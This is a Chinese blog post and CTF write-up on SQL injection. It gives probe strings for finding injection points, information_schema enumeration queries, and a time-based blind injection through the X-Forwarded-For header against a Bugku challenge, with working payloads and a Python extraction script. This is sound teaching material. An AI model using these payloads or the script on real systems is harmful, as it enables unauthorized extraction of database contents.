---
title: SQL注入的套路
layout: post
categories: web安全
tags: sql注入
---
记录一般的 SQL 注入的套路，持续更新......
<!--more-->

## 0x01 判断注入点

如果产生预期结果，那么就表示存在注入点

### 1.字符型注入的判断

```
构造测试                        预期结果                         变种
a'                      //触发错误，返回数据库错误                              
a' or '1'='1            //永真条件，返回所有记录               a') or ('1'=1   
a' or '1'='2            //空条件，返回原来相同结果             a') or ('1'=2
a' and '1'='2           //永假条件，不返回记录                 a') and ('1'='2
```

### 2.数字型注入的判断

```
构造测试                        预期结果                         变种
'                       //触发错误，返回数据库错误                  
1+1                     //返回原来相同的结果                    3-1
1+0                     //返回原来相同的结果                     
1 or 1=1                //永真条件，返回所有记录                 1) or (1=1
1 or 1=2                //空条件，返回原来相同的结果              1) or (1=2
1 and 1=2               //永假条件，不返回记录                   1) and (1=2
```

### 3.服务端错误返回形式

- 错误直接回显在页面上
- 错误隐藏在页面源代码中
- 检测到错误跳转到另一个页面
- 返回HTTP错误代码500或重定向302
- 适当处理错误结果，常显示一个通用错误页面

<br>

## 0x02 SQL 注入的步骤

**查询数据库名—>查询表名—>查询字段名—>查询目标数据**

### 1. 查询数据库名

```
select database()
```

这里假设查出来的数据库名是 test.

### 2.查询表名

```
select table_name from information_schema.tables where table_schema= 'test'
```



假设这里查出来的表名是 users.

### 3.查询字段名

```
select column_name from information_schema.columns where table_schema= 'test' and table_name='users'
```

到此为止有了字段名和表名就可以查询我们想要的数据了，假设这里查出来的 password 字段是我们的目标字段.

### 4.查询目标数据

```
select password from users
```

<br>

## 0x03 例子

1.[INSERT INTO注入](http://ctf.bugku.com/challenges)

这道题给出的后台源码是这样的：

```php
error_reporting(0);

function getIp(){
$ip = '';
if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}else{
$ip = $_SERVER['REMOTE_ADDR'];
}
$ip_arr = explode(',', $ip);
return $ip_arr[0];

}

$host="localhost";
$user="";
$pass="";
$db="";

$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");

mysql_select_db($db) or die("Unable to select database");

$ip = getIp();
echo 'your ip is :'.$ip;
$sql="insert into client_ip (ip) values ('$ip')";
mysql_query($sql);
```

从以上代码可以看出，这里过滤了 IP 里的逗号，也就意味着不能使用 `substr(X,1,1)`之类含有逗号的一些函数。**无论在 XFF 后添加什么东西，都会返回原来的东西，所以应该是 Insert 型的 SQL 注入，考虑时间盲注。**首先给出这题的 **tips**

```
select case when 条件 then 执行1 else 执行2

substr(X,1,1) --> substr() from 1 for 1
```

**payload:**

```
11'+(select case when substr((select flag from flag) from 1 for 1)='a' then sleep(5) else 0 end))%23
```

###  Step1.暴出数据库名

```python
#encoding: utf-8
import requests
import string

mystring = string.ascii_letters+string.digits+string.punctuation
url='http://120.24.86.145:8002/web15/'
data = "'+(select case when (substring((select database() ) from {0} for 1)='{1}') then sleep(5) else 1 end)) #"
flag = ''

for i in range(1,10):
    for j in mystring:
        try:
            headers = {'x-forwarded-for':data.format(str(i),j)}
            res = requests.get(url,headers=headers,timeout=4)
        except requests.exceptions.ReadTimeout:
            flag += j
            print(flag)
            break

print('The database name is '+flag)
```

原理是利用`11+false/true`去进行判断，如果是 true，就会 `sleep(5)`，从而执行 except 里面的代码。

### Step2.查询表名

**payload：**

```
data = "'+(select case when (substring((select table_name from information_schema.tables where table_schema= 'web15' limit 1 offset {0}) from {1} for 1)='{2}') then sleep(5) else 1 end)) #"
```

### Step3.查询列名

**payload:**

```
data = "'+(select case when (substring((select column_name from information_schema.columns where table_name='flag' limit 1 offset {0}) from {1} for 1)='{2}') then sleep(5) else 1 end)) #"
```

### Step4.查询目标数据

**payload:**

```
data = "'+(select case when (substring((select flag from flag) from {0} for 1)='{1}') then sleep(5) else 1 end)) #"
```













